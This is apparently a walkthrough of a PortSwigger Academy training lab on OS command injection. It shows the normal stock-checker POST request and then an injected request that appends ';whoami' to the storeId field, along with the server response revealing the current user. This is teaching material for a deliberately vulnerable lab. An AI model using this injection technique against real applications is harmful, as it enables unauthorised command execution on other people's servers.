---
title: "PortSwigger Academy — OS command injection, simple case (Web) Walkthrough"
---
# OS command injection, simple case

```
❓

This lab contains an OS command injection vulnerability in the product stock checker.

The application executes a shell command containing user-supplied product and store IDs, and returns the raw output from the command in its response.

To solve the lab, execute the `whoami` command to determine the name of the current user.
```

Head over to one of the product pages and click the `Check stock` button, this is send a POST request to the server and containing the parameters `productId` and `storeId`.

```txt
POST /product/stock HTTP/2
Host: 0a6700670462ce52821d797a007400d8.web-security-academy.net
Cookie: session=HgaWzhGnLJbFt7yM3FOWI1V7uqOfnJTG
Content-Length: 28
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Not?A_Brand";v="99", "Chromium";v="130"
Content-Type: application/x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: */*
Origin: https://0a6700670462ce52821d797a007400d8.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a6700670462ce52821d797a007400d8.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

productId=1&storeId=1
```

This request will return the remaining stock for that product, but what happens when we append delimiter to the end of the store ID as shown in this request?

```txt
POST /product/stock HTTP/2
Host: 0a6700670462ce52821d797a007400d8.web-security-academy.net
Cookie: session=HgaWzhGnLJbFt7yM3FOWI1V7uqOfnJTG
Content-Length: 21
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Not?A_Brand";v="99", "Chromium";v="130"
Content-Type: application/x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: */*
Origin: https://0a6700670462ce52821d797a007400d8.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a6700670462ce52821d797a007400d8.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

productId=1&storeId=1;whoami
```

```txt
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 16

62
peter-UL2JZe

```
